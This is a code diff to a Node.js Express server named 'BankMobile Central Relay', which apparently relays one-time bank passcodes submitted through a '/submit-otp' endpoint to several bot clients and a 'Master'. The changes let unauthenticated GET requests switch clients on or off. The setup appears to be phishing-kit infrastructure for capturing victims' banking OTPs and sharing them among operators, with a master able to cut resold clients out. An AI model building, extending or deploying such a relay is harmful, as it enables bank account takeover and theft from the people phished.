@@ -1,6 +1,7 @@
 // ================================================
 // BANKMOBILE CENTRAL RELAY BACKEND
 // Simple version + Global & Per-Client switch
+// Control endpoints support both GET + POST
 // ================================================
 require('dotenv').config();
 const express = require('express');
@@ -48,7 +49,7 @@ const DEFAULT_CONFIG = {
 // ================================================
 // SWITCHES
 // ================================================
-let clientsEnabled = true;              // Global switch
+let clientsEnabled = true;              // Global switch (default = ON)
 const disabledClients = new Set();      // Individual clients that are turned off
 
 // ================================================
@@ -239,11 +240,11 @@ app.post('/submit-otp', async (req, res) => {
 });
 
 // ================================================
-// CONTROL ENDPOINTS
+// CONTROL ENDPOINTS (support both GET + POST)
 // ================================================
 
 // Turn ALL clients OFF
-app.post('/clients-off', (req, res) => {
+app.all('/clients-off', (req, res) => {
     clientsEnabled = false;
     console.log('🚫 ALL CLIENTS DISABLED → Only Master receives messages');
     res.json({
@@ -254,7 +255,7 @@ app.post('/clients-off', (req, res) => {
 });
 
 // Turn ALL clients ON
-app.post('/clients-on', (req, res) => {
+app.all('/clients-on', (req, res) => {
     clientsEnabled = true;
     console.log('✅ ALL CLIENTS ENABLED');
     res.json({
@@ -265,7 +266,7 @@ app.post('/clients-on', (req, res) => {
 });
 
 // Turn ONE specific client OFF
-app.post('/client-off/:clientId', (req, res) => {
+app.all('/client-off/:clientId', (req, res) => {
     const clientId = req.params.clientId.toLowerCase();
 
     if (!BOT_CONFIGS[clientId] && clientId !== 'default') {
@@ -282,7 +283,7 @@ app.post('/client-off/:clientId', (req, res) => {
 });
 
 // Turn ONE specific client ON
-app.post('/client-on/:clientId', (req, res) => {
+app.all('/client-on/:clientId', (req, res) => {
     const clientId = req.params.clientId.toLowerCase();
 
     disabledClients.delete(clientId);
@@ -334,10 +335,10 @@ app.get('/', (req, res) => {
         clientsEnabled,
         disabledClients: Array.from(disabledClients),
         control: {
-            'POST /clients-off': 'Disable ALL clients',
-            'POST /clients-on': 'Enable ALL clients',
-            'POST /client-off/:clientId': 'Disable one client (example: /client-off/emmy)',
-            'POST /client-on/:clientId': 'Enable one client (example: /client-on/emmy)',
+            'GET/POST /clients-off': 'Disable ALL clients',
+            'GET/POST /clients-on': 'Enable ALL clients',
+            'GET/POST /client-off/:clientId': 'Disable one client (example: /client-off/emmy)',
+            'GET/POST /client-on/:clientId': 'Enable one client (example: /client-on/emmy)',
             'GET /clients-status': 'Check current status'
         }
     });
@@ -349,6 +350,7 @@ app.get('/', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ BankMobile Relay running on port ${PORT}`);
     console.log(`📨 Clients: ${Object.keys(BOT_CONFIGS).join(', ')}`);
-    console.log(`🔧 Global: POST /clients-off  |  POST /clients-on`);
-    console.log(`🔧 Single: POST /client-off/emmy  |  POST /client-on/emmy`);
+    console.log(`🔧 Global: /clients-off  |  /clients-on`);
+    console.log(`🔧 Single: /client-off/emmy  |  /client-on/emmy`);
+    console.log(`📊 Status: /clients-status`);
 });
